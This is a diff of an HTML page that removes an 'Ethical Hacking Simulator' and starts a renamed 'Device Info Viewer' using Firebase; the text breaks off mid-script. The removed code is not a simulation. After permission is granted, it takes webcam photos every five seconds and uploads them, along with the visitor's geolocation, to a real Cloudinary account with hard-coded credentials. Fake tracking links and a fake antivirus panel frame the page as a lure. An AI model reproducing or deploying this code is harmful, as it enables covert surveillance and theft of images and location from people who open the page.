@@ -1,1120 +1,200 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ethical Hacking Simulator - Educational Use Only</title>
-    <!-- Firebase is still configured but commented out as per original code,
-         uploads will go to Cloudinary instead -->
-    <!-- <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script> -->
-    <!-- <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script> -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary: #0f172a;
-            --secondary: #1e293b;
-            --accent: #8b5cf6;
-            --danger: #ef4444;
-            --warning: #f59e0b;
-            --success: #10b981;
-            --text: #f1f5f9;
-            --card: rgba(30, 41, 59, 0.8);
-            --glass: rgba(15, 23, 42, 0.7);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #0c1220, #1a2436);
-            color: var(--text);
-            min-height: 100vh;
-            padding: 20px;
-            line-height: 1.6;
-            overflow-x: hidden;
-            position: relative;
-        }
-
-        .background-pattern {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background:
-                radial-gradient(circle at 10% 20%, rgba(139, 92, 246, 0.1) 0%, transparent 20%),
-                radial-gradient(circle at 90% 80%, rgba(239, 68, 68, 0.1) 0%, transparent 20%),
-                radial-gradient(circle at 50% 50%, rgba(16, 185, 129, 0.1) 0%, transparent 30%);
-            z-index: -1;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 1;
-        }
-
-        header {
-            text-align: center;
-            padding: 30px 0;
-            margin-bottom: 20px;
-            position: relative;
-            background: var(--glass);
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(139, 92, 246, 0.2);
-            margin-top: 20px;
-        }
-
-        h1 {
-            font-size: 2.8rem;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, var(--accent), #ec4899);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
-        }
-
-        .header-subtitle {
-            color: #94a3b8;
-            font-size: 1.1rem;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .disclaimer {
-            background: rgba(239, 68, 68, 0.15);
-            border: 1px solid var(--danger);
-            border-radius: 12px;
-            padding: 20px;
-            margin: 30px 0;
-            text-align: center;
-            font-size: 1rem;
-            backdrop-filter: blur(5px);
-            box-shadow: 0 5px 15px rgba(239, 68, 68, 0.1);
-        }
-
-        .disclaimer strong {
-            color: var(--danger);
-            font-size: 1.1rem;
-        }
-
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-            margin-top: 40px;
-        }
-
-        .card {
-            background: var(--card);
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-            transition: all 0.4s ease;
-            cursor: pointer;
-            position: relative;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(139, 92, 246, 0.1);
-        }
-
-        .card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 35px rgba(139, 92, 246, 0.25);
-            border-color: rgba(139, 92, 246, 0.3);
-        }
-
-        .card-header {
-            padding: 25px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            background: rgba(15, 23, 42, 0.4);
-        }
-
-        .card-icon {
-            width: 60px;
-            height: 60px;
-            background: rgba(139, 92, 246, 0.2);
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            color: var(--accent);
-        }
-
-        .card h3 {
-            font-size: 1.5rem;
-            font-weight: 600;
-        }
-
-        .card-content {
-            padding: 20px;
-            font-size: 1rem;
-            color: #cbd5e1;
-            min-height: 120px;
-        }
-
-        .card-footer {
-            background: rgba(0, 0, 0, 0.2);
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .btn {
-            background: linear-gradient(90deg, var(--accent), #7c3aed);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(139, 92, 246, 0.4);
-        }
-
-        .status {
-            font-size: 0.9rem;
-            padding: 5px 12px;
-            border-radius: 20px;
-            background: rgba(16, 185, 129, 0.2);
-            color: var(--success);
-        }
-
-        .status.error {
-            background: rgba(239, 68, 68, 0.2);
-            color: var(--danger);
-        }
-
-        .status.warning {
-            background: rgba(245, 158, 11, 0.2);
-            color: var(--warning);
-        }
-
-        .firebase-status {
-            text-align: center;
-            margin: 30px 0;
-            padding: 20px;
-            border-radius: 12px;
-            background: rgba(16, 185, 129, 0.1);
-            border: 1px solid var(--success);
-            backdrop-filter: blur(5px);
-        }
-        /* Update this to reflect Cloudinary */
-         .storage-status {
-            text-align: center;
-            margin: 30px 0;
-            padding: 20px;
-            border-radius: 12px;
-            background: rgba(139, 92, 246, 0.1); /* Use accent color */
-            border: 1px solid var(--accent);
-            backdrop-filter: blur(5px);
-        }
-
-
-        .result-container {
-            margin-top: 50px;
-            background: var(--glass);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(139, 92, 246, 0.1);
-            backdrop-filter: blur(5px);
-        }
-
-        .result-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        #result-content {
-            background: rgba(15, 23, 42, 0.5);
-            border-radius: 12px;
-            padding: 25px;
-            min-height: 250px;
-            font-family: 'Courier New', monospace;
-            white-space: pre-wrap;
-            overflow-x: auto;
-            color: #a3e635;
-            font-size: 0.95rem;
-            border: 1px solid rgba(139, 92, 246, 0.1);
-        }
-
-        .camera-feed {
-            width: 100%;
-            background: linear-gradient(45deg, #0f172a, #1e293b);
-            border-radius: 12px;
-            aspect-ratio: 16/9; /* Maintain aspect ratio */
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 20px;
-            border: 1px solid rgba(139, 92, 246, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .camera-feed video {
-            display: none; /* Hide video initially */
-            width: 100%;
-            height: 100%; /* Fill container */
-            object-fit: cover; /* Cover the container without distortion */
-        }
-
-
-        .camera-placeholder {
-            text-align: center;
-            color: #94a3b8;
-            padding: 20px;
-            z-index: 2;
-            position: absolute; /* Position over video */
-            top: 0; bottom: 0; left: 0; right: 0;
-            display: flex; /* Center content */
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .camera-placeholder i {
-            font-size: 4rem;
-            color: var(--accent);
-            margin-bottom: 20px;
-        }
-
-        .camera-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background:
-                linear-gradient(90deg, transparent 50%, rgba(139, 92, 246, 0.05) 50%),
-                linear-gradient(transparent 50%, rgba(139, 92, 246, 0.05) 50%);
-            background-size: 30px 30px;
-            z-index: 1;
-        }
-
-        .unique-link {
-            background: rgba(15, 23, 42, 0.7);
-            border: 1px solid var(--accent);
-            border-radius: 8px;
-            padding: 15px;
-            margin: 20px 0;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-family: monospace;
-            color: var(--accent);
-            word-break: break-all;
-        }
-
-        .copy-btn {
-            background: rgba(139, 92, 246, 0.2);
-            border: none;
-            color: var(--accent);
-            padding: 8px 15px;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-left: 10px;
-            transition: all 0.3s ease;
-            flex-shrink: 0; /* Prevent button from shrinking */
-        }
-
-        .copy-btn:hover {
-            background: rgba(139, 92, 246, 0.3);
-        }
-
-        .antivirus-shield {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(135deg, var(--success), #059669);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            color: white;
-            box-shadow: 0 5px 20px rgba(16, 185, 129, 0.4);
-            animation: pulse 2s infinite;
-            z-index: 100;
-            cursor: pointer;
-            border: 2px solid white;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.6); }
-            70% { box-shadow: 0 0 0 15px rgba(16, 185, 129, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
-        }
-
-        .antivirus-panel {
-            position: fixed;
-            bottom: 120px;
-            right: 30px;
-            width: 300px;
-            background: var(--glass);
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            backdrop-filter: blur(10px);
-            transform: translateY(20px);
-            opacity: 0;
-            pointer-events: none;
-            transition: all 0.4s ease;
-            z-index: 99;
-        }
-
-        .antivirus-panel.active {
-            transform: translateY(0);
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .antivirus-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 15px;
-            color: var(--success);
-        }
-
-        .threat-list {
-            list-style: none;
-            margin-top: 15px;
-        }
-
-        .threat-list li {
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .threat-status {
-            color: var(--success);
-            font-weight: bold;
-        }
-
-        .threat-status.found {
-            color: var(--danger);
-        }
-
-        .download-section {
-            text-align: center;
-            margin: 40px 0;
-            padding: 30px;
-            background: var(--glass);
-            border-radius: 20px;
-            border: 1px solid rgba(139, 92, 246, 0.2);
-        }
-
-        .download-btn {
-            background: linear-gradient(90deg, var(--accent), #7c3aed);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            border-radius: 10px;
-            font-weight: 600;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 20px rgba(139, 92, 246, 0.3);
-            margin-top: 20px;
-        }
-
-        .download-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.4);
-        }
-
-        .terminal-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: var(--accent);
-            margin-bottom: 15px;
-        }
-
-        .terminal-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: var(--danger);
-        }
-
-        .terminal-dot.yellow {
-            background: var(--warning);
-        }
-
-        .terminal-dot.green {
-            background: var(--success);
-        }
-
-        .progress-bar {
-            height: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            overflow: hidden;
-            margin: 15px 0;
-        }
-
-        .progress {
-            height: 100%;
-            background: linear-gradient(90deg, var(--accent), #ec4899);
-            border-radius: 4px;
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-
-        @media (max-width: 768px) {
-            .grid-container {
-                grid-template-columns: 1fr;
-            }
-
-            h1 {
-                font-size: 2.2rem;
-            }
-
-            .antivirus-panel {
-                width: calc(100% - 40px);
-                right: 20px;
-                left: 20px;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Device Info Viewer</title>
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #f9fafb;
+      color: #111827;
+    }
+    header {
+      background: #4f46e5;
+      color: white;
+      padding: 1rem;
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: bold;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    .container {
+      padding: 1rem;
+      max-width: 800px;
+      margin: auto;
+    }
+    .card {
+      background: white;
+      border-radius: 1rem;
+      padding: 1rem;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+      margin-bottom: 1rem;
+    }
+    .card h3 {
+      margin: 0 0 0.5rem 0;
+      font-size: 1.2rem;
+      color: #1f2937;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .card p {
+      margin: 0.25rem 0;
+      color: #4b5563;
+      font-size: 0.95rem;
+    }
+    .toggle-btn {
+      background: #e0e7ff;
+      color: #3730a3;
+      border: none;
+      padding: 0.5rem 1rem;
+      margin: 0.5rem 0;
+      border-radius: 0.5rem;
+      cursor: pointer;
+      font-size: 0.9rem;
+      width: 100%;
+      transition: background 0.2s;
+    }
+    .toggle-btn:hover {
+      background: #c7d2fe;
+    }
+    .section-content {
+      display: none;
+      margin-top: 0.75rem;
+      background: #f3f4f6;
+      padding: 0.75rem;
+      border-radius: 0.5rem;
+      font-size: 0.85rem;
+      font-family: monospace;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    @media (max-width: 480px) {
+      .card {
+        padding: 0.75rem;
+      }
+      .card h3 {
+        font-size: 1rem;
+      }
+      .card p {
+        font-size: 0.85rem;
+      }
+      .toggle-btn {
+        font-size: 0.8rem;
+        padding: 0.4rem 0.8rem;
+      }
+      .container {
+        padding: 0.75rem;
+      }
+    }
+    @media (max-width: 360px) {
+      header {
+        font-size: 1.2rem;
+      }
+      .card h3 {
+        font-size: 0.9rem;
+      }
+      .card p {
+        font-size: 0.8rem;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="background-pattern"></div>
-    <div class="container">
-        <header>
-            <h1><i class="fas fa-user-secret"></i> Ethical Hacking Simulator</h1>
-            <p class="header-subtitle">Educational Tool for Cybersecurity Awareness</p>
-        </header>
-
-        <div class="disclaimer">
-            <strong><i class="fas fa-exclamation-triangle"></i> IMPORTANT DISCLAIMER:</strong> This simulation tool is for educational purposes only. It demonstrates *how* malicious requests work in a browser. **It will request access to your camera and location (if you click those buttons) and attempt to upload simulated data to a provided Cloudinary account.** Unauthorized access to systems or data is illegal. Use this tool *only* to understand cybersecurity threats and protect yourself. The Cloudinary upload uses an insecure method for demonstration.
-        </div>
-
-        <!-- Update status message -->
-        <div class="storage-status">
-             <p><i class="fas fa-cloud-upload-alt"></i> Cloudinary Simulation Storage</p>
-             <p>Cloud Name: dhw1xn7ko | Unsigned Preset: Raazbhai</p>
-             <p style="color: var(--danger); font-weight: bold; margin-top: 5px;">WARNING: Unsigned uploads are insecure for real applications.</p>
-        </div>
-
-
-        <div class="grid-container">
-            <!-- Camera Hack Card -->
-            <div class="card" onclick="simulateHack('camera')">
-                <div class="card-header">
-                    <div class="card-icon"><i class="fas fa-camera"></i></div>
-                    <h3>CAMERA HACK</h3>
-                </div>
-                <div class="card-content">
-                    <p>Simulates how hackers create malicious links to access your camera. Demonstrates the importance of checking permissions and shows simulated capture/upload.</p>
-                </div>
-                <div class="card-footer">
-                    <span class="status"><i class="fas fa-shield-alt"></i> Protected</span>
-                    <button class="btn">Start Simulation</button>
-                </div>
-            </div>
-
-            <!-- Location Hack Card -->
-            <div class="card" onclick="simulateHack('location')">
-                <div class="card-header">
-                    <div class="card-icon"><i class="fas fa-map-marker-alt"></i></div>
-                    <h3>LOCATION HACK</h3>
-                </div>
-                <div class="card-content">
-                    <p>Shows how your location can be tracked through malicious links/apps. Learn how to prevent location tracking by understanding permission requests.</p>
-                </div>
-                <div class="card-footer">
-                    <span class="status"><i class="fas fa-shield-alt"></i> Protected</span>
-                    <button class="btn">Start Simulation</button>
-                </div>
-            </div>
-
-            <!-- Call Logs Hack Card -->
-            <div class="card" onclick="simulateHack('callLogs')">
-                <div class="card-header">
-                    <div class="card-icon"><i class="fas fa-phone-alt"></i></div>
-                    <h3>CALL LOGS HACK</h3>
-                </div>
-                <div class="card-content">
-                    <p>Simulates unauthorized access to call logs (not possible via browser). Understand how apps request unnecessary permissions.</p>
-                </div>
-                <div class="card-footer">
-                    <span class="status warning"><i class="fas fa-exclamation-triangle"></i> Limited</span>
-                    <button class="btn">Start Simulation</button>
-                </div>
-            </div>
-
-            <!-- Device Info Hack Card -->
-            <div class="card" onclick="simulateHack('deviceInfo')">
-                <div class="card-header">
-                    <div class="card-icon"><i class="fas fa-mobile-alt"></i></div>
-                    <h3>DEVICE INFO HACK</h3>
-                </div>
-                <div class="card-content">
-                    <p>Reveals what device information websites can access and simulates saving it. Learn how to protect your privacy online.</p>
-                </div>
-                <div class="card-footer">
-                    <span class="status"><i class="fas fa-shield-alt"></i> Protected</span>
-                    <button class="btn">Start Simulation</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="result-container">
-            <div class="result-header">
-                <h2><i class="fas fa-terminal"></i> Simulation Results</h2>
-                <span class="status" id="status-indicator">Ready</span>
-            </div>
-
-            <div class="terminal-header">
-                <div class="terminal-dot"></div>
-                <div class="terminal-dot yellow"></div>
-                <div class="terminal-dot green"></div>
-                <span>terminal ~ EthicalHackingSimulator</span>
-            </div>
-
-            <div id="result-content">
-                > Select an option to start simulation...
-                > This tool will demonstrate cybersecurity concepts for educational purposes
-                > No actual hacking will be performed
-            </div>
-
-            <div class="progress-bar">
-                <div class="progress" id="simulation-progress"></div>
-            </div>
-
-            <div id="unique-link-container" style="display: none;">
-                <h3><i class="fas fa-link"></i> Generated Tracking Link (Simulated)</h3>
-                <div class="unique-link">
-                    <span id="unique-link-text">https://ethicalhack.example/simulate/track?id=ABCD1234</span>
-                    <button class="copy-btn" onclick="copyToClipboard()"><i class="fas fa-copy"></i> Copy</button>
-                </div>
-                <p>This simulated link *represents* how hackers would spread malicious links. Always verify links before clicking!</p>
-            </div>
-
-            <div id="camera-feed" class="camera-feed" style="display: none;">
-                 <video id="camera-stream" autoplay playsinline style="display: none;"></video>
-                 <canvas id="camera-canvas" style="display: none;"></canvas> <!-- Hidden canvas for capture -->
-                <div class="camera-overlay"></div>
-                <div class="camera-placeholder">
-                    <i class="fas fa-camera"></i>
-                    <h3 id="camera-placeholder-text">Waiting for Camera Permission...</h3>
-                    <p style="color: #ef4444; margin-top: 15px;"><i class="fas fa-shield-alt"></i> Always check permission requests!</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="download-section">
-            <h3><i class="fas fa-download"></i> Download Security Application</h3>
-            <p>This simulated app would activate the antivirus protection features when installed with all permissions</p>
-            <button class="download-btn" onclick="simulateDownload()"><i class="fas fa-shield-virus"></i> Download Security App</button>
-            <p style="margin-top: 15px; font-size: 0.9rem; color: #94a3b8;">Note: This is a simulation. No actual app will be downloaded.</p>
-        </div>
-    </div>
-
-    <div class="antivirus-shield" onclick="toggleAntivirusPanel()">
-        <i class="fas fa-shield-alt"></i>
-    </div>
-
-    <div class="antivirus-panel" id="antivirus-panel">
-        <div class="antivirus-header">
-            <i class="fas fa-shield-virus"></i>
-            <h3>Security Shield Active</h3>
-        </div>
-        <p>This simulated antivirus is protecting your device from threats.</p>
-        <p><strong>Status:</strong> <span class="threat-status">All systems secure</span></p>
-
-        <h4 style="margin-top: 20px;">Recent Threat Detection</h4>
-        <ul class="threat-list">
-            <li>Camera Access Attempt <span class="threat-status">Blocked</span></li>
-            <li>Location Tracking <span class="threat-status">Blocked</span></li>
-            <li>Malicious Link <span class="threat-status">Blocked</span></li>
-            <li>Data Theft Attempt <span class="threat-status">Blocked</span></li>
-        </ul>
-
-        <div style="margin-top: 20px; text-align: center;">
-            <button class="btn" style="width: 100%;" onclick="runVirusScan()">
-                <i class="fas fa-search"></i> Run Full System Scan
-            </button>
-        </div>
-    </div>
-
-    <script>
-        // Cloudinary Configuration (Using your provided details)
-        // WARNING: Using unsigned uploads directly from the client is INSECURE for real applications.
-        // This is for educational demonstration ONLY.
-        const CLOUDINARY_CLOUD_NAME = "dhw1xn7ko";
-        const CLOUDINARY_UPLOAD_PRESET = "Raazbhai"; // Your unsigned preset name
-        const CLOUDINARY_UPLOAD_URL = `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/auto/upload`; // Using 'auto' resource type
-
-
-        // DOM Elements
-        const antivirusPanel = document.getElementById('antivirus-panel');
-        const statusIndicator = document.getElementById('status-indicator');
-        const progressBar = document.getElementById('simulation-progress');
-        const resultContent = document.getElementById('result-content');
-        const uniqueLinkContainer = document.getElementById('unique-link-container');
-        const uniqueLinkText = document.getElementById('unique-link-text');
-        const cameraFeedDiv = document.getElementById('camera-feed');
-        const cameraStreamElement = document.getElementById('camera-stream');
-        const cameraCanvasElement = document.getElementById('camera-canvas');
-        const cameraPlaceholder = document.querySelector('#camera-feed .camera-placeholder');
-        const cameraPlaceholderText = document.getElementById('camera-placeholder-text');
-
-        let cameraStream = null; // To hold the camera stream
-        let captureInterval = null; // To hold the interval ID for photo capture
-
-        // Helper function to append text to result content
-        function appendResult(text) {
-            resultContent.innerHTML += `\n> ${text}`;
-            resultContent.scrollTop = resultContent.scrollHeight; // Scroll to bottom
-        }
-
-        // Function to upload data (Blob or File) to Cloudinary
-        async function uploadToCloudinary(file, folderName, resourceType = 'auto') {
-             appendResult(`Attempting to upload to Cloudinary...`);
-
-            const formData = new FormData();
-            formData.append('file', file);
-            formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
-             // Optional: Add a folder
-            if (folderName) {
-                formData.append('folder', folderName);
-            }
-             // Optional: Set resource_type if needed (e.g., 'raw' for text files)
-             if (resourceType !== 'auto') {
-                  formData.append('resource_type', resourceType);
-             }
-
-
-            try {
-                const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/${resourceType}/upload`, {
-                    method: 'POST',
-                    body: formData,
-                });
-
-                if (!response.ok) {
-                     const error = await response.json();
-                     console.error('Cloudinary upload failed:', error);
-                     appendResult(`Cloudinary upload FAILED: ${error.error ? error.error.message : response.statusText}`);
-                     return null;
-                }
-
-                const data = await response.json();
-                console.log('Cloudinary upload successful:', data);
-                appendResult(`Cloudinary upload SUCCESS!`);
-                appendResult(`  - Public ID: ${data.public_id}`);
-                 appendResult(`  - URL: ${data.secure_url}`);
-                 return data.secure_url; // Return the secure URL
-            } catch (error) {
-                console.error('Cloudinary upload error:', error);
-                appendResult(`Cloudinary upload ERROR: ${error.message}`);
-                 return null;
-            }
-        }
-
-
-        // Function to stop camera stream and clear interval
-        function stopCamera() {
-            if (captureInterval) {
-                clearInterval(captureInterval);
-                captureInterval = null;
-                 appendResult('Camera capture stopped.');
-            }
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-                cameraStreamElement.style.display = 'none';
-                 cameraPlaceholder.style.display = 'flex'; // Show placeholder again
-                cameraPlaceholderText.textContent = 'Camera simulation ended.';
-                 appendResult('Camera stream stopped.');
-            }
-        }
-
-
-        // Simulate hack based on type
-        async function simulateHack(type) {
-            // Stop any ongoing camera process before starting a new simulation
-            stopCamera();
-
-            // Reset UI elements
-            resultContent.innerHTML = "";
-            uniqueLinkContainer.style.display = "none";
-            cameraFeedDiv.style.display = "none"; // Hide camera feed area by default
-            cameraStreamElement.style.display = "none"; // Hide video element
-            cameraPlaceholder.style.display = 'flex'; // Show placeholder
-            cameraPlaceholderText.textContent = `Waiting for ${type === 'camera' ? 'Camera' : 'Location'} Permission...`;
-
-            progressBar.style.width = "0%";
-            statusIndicator.textContent = "Processing...";
-            statusIndicator.className = "status warning";
-
-            // Generate unique ID
-            const uniqueId = Math.random().toString(36).substr(2, 12).toUpperCase();
-            const simulatedLink = `https://eduhack-${uniqueId}.ethicalsimulator.org`;
-
-            // Simulate progress
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 2;
-                progressBar.style.width = `${progress}%`;
-                if (progress >= 100) {
-                    clearInterval(progressInterval);
-                    // Once progress hits 100%, proceed with specific hack logic
-                    handleSpecificHack(type, uniqueId, simulatedLink);
-                }
-            }, 25); // Faster progress for responsiveness
-        }
-
-        // Handle specific hack logic after initial simulation progress
-        async function handleSpecificHack(type, uniqueId, simulatedLink) {
-             appendResult(`Simulation progress complete for ${type} hack.`);
-             statusIndicator.textContent = "Executing Payload...";
-             statusIndicator.className = "status warning";
-
-
-            const timestamp = new Date().toLocaleString();
-
-            // Display common simulation text
-             resultContent.innerHTML =
-`> Starting ${type.toUpperCase()} HACK simulation...
-> Generating tracking link (simulated): ${simulatedLink}
-> Simulating link distribution...
-> Timestamp: ${timestamp}`;
-
-            // Display the simulated link
-            uniqueLinkContainer.style.display = "block";
-            uniqueLinkText.textContent = simulatedLink;
-
-
-            switch(type) {
-                case 'camera':
-                     appendResult('Requesting camera permission...');
-                     cameraFeedDiv.style.display = "flex"; // Show camera feed area
-
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                        cameraStream = stream; // Store stream to stop it later
-                         appendResult('Camera permission GRANTED.');
-
-                         cameraStreamElement.srcObject = stream;
-                         cameraStreamElement.style.display = 'block'; // Show video
-                         cameraPlaceholder.style.display = 'none'; // Hide placeholder
-                         cameraPlaceholderText.textContent = 'Camera feed active'; // Update text (though hidden)
-
-
-                        // Wait for video to load metadata to get actual dimensions
-                        cameraStreamElement.onloadedmetadata = () => {
-                             const width = cameraStreamElement.videoWidth;
-                             const height = cameraStreamElement.videoHeight;
-                             cameraCanvasElement.width = width;
-                             cameraCanvasElement.height = height;
-                              appendResult(`Camera stream dimensions: ${width}x${height}`);
-
-
-                            // Start capturing photos every 5 seconds
-                            appendResult('Starting photo capture every 5 seconds...');
-                            let captureCount = 0;
-                            captureInterval = setInterval(async () => {
-                                if (!cameraStream) { // Check if stream is still active
-                                     appendResult('Camera stream stopped, stopping interval.');
-                                    clearInterval(captureInterval);
-                                    captureInterval = null;
-                                    return;
-                                }
-
-                                try {
-                                    const context = cameraCanvasElement.getContext('2d');
-                                    context.drawImage(cameraStreamElement, 0, 0, width, height);
-
-                                    cameraCanvasElement.toBlob(async (blob) => {
-                                        if (blob) {
-                                            const filename = `camera_${uniqueId}_${Date.now()}.png`;
-                                            appendResult(`Capturing photo (${++captureCount})...`);
-                                             // Upload the photo Blob to Cloudinary
-                                            await uploadToCloudinary(blob, `hacks/camera/${uniqueId}`);
-                                        } else {
-                                            appendResult('Failed to create Blob from canvas.');
-                                        }
-                                    }, 'image/png');
-
-                                } catch (captureError) {
-                                     console.error('Error during camera capture:', captureError);
-                                     appendResult(`Capture Error: ${captureError.message}`);
-                                     stopCamera(); // Stop on error
-                                }
-
-                            }, 5000); // 5000 milliseconds = 5 seconds
-
-                             appendResult(` EDUCATIONAL CONTENT:
-! Malicious actors create links that request camera access
-! Once granted, they can spy on you and capture images
-! Always check the URL before granting camera permissions
-! Cover your camera when not in use for extra security`);
-
-
-                        }
-
-                    } catch (error) {
-                         console.error('Camera permission denied or error:', error);
-                         appendResult(`Camera access DENIED or ERROR: ${error.name} - ${error.message}`);
-                         cameraPlaceholderText.textContent = `Camera Access Denied: ${error.name}`;
-                         statusIndicator.textContent = 'Permission Denied';
-                         statusIndicator.className = 'status error';
-                         // Hide camera feed area if access denied
-                         cameraFeedDiv.style.display = "none";
-                    }
-                    break;
-
-                case 'location':
-                     appendResult('Requesting location permission...');
-                     cameraFeedDiv.style.display = "none"; // Hide camera feed area
-
-                    if ("geolocation" in navigator) {
-                        navigator.geolocation.getCurrentPosition(
-                            async (position) => {
-                                 appendResult('Location permission GRANTED.');
-                                const locationData = {
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    timestamp: new Date(position.timestamp).toISOString(),
-                                    simulatedLinkId: simulatedLink
-                                };
-                                const locationText = `Location Data:\n` +
-                                                     `Latitude: ${locationData.latitude}\n` +
-                                                     `Longitude: ${locationData.longitude}\n` +
-                                                     `Accuracy: ${locationData.accuracy} meters\n` +
-                                                     `Timestamp: ${locationData.timestamp}\n` +
-                                                     `Simulated Link ID: ${locationData.simulatedLinkId}`;
-
-                                 appendResult('Collected location data:');
-                                 appendResult(locationText);
-
-
-                                 // Upload the location data as data.txt to Cloudinary
-                                const locationBlob = new Blob([locationText], { type: 'text/plain' });
-                                const locationFilename = `location_${uniqueId}.txt`;
-                                 await uploadToCloudinary(locationBlob, `hacks/location/${uniqueId}`, 'raw');
-
-
-                                 appendResult(` EDUCATIONAL CONTENT:
-! Hackers trick users into sharing their location
-! This data can be used for tracking or malicious purposes
-! Only share location with trusted apps and websites
-! Review location permissions in your device settings`);
-
-
-                            },
-                            (error) => {
-                                 console.error('Location permission denied or error:', error);
-                                 let errorMessage = '';
-                                switch(error.code) {
-                                    case error.PERMISSION_DENIED:
-                                        errorMessage = "Permission Denied";
-                                        break;
-                                    case error.POSITION_UNAVAILABLE:
-                                        errorMessage = "Location Unavailable";
-                                        break;
-                                    case error.TIMEOUT:
-                                        errorMessage = "Request Timeout";
-                                        break;
-                                    default:
-                                        errorMessage = `Unknown Error (${error.code})`;
-                                        break;
-                                }
-                                 appendResult(`Location access DENIED or ERROR: ${errorMessage}`);
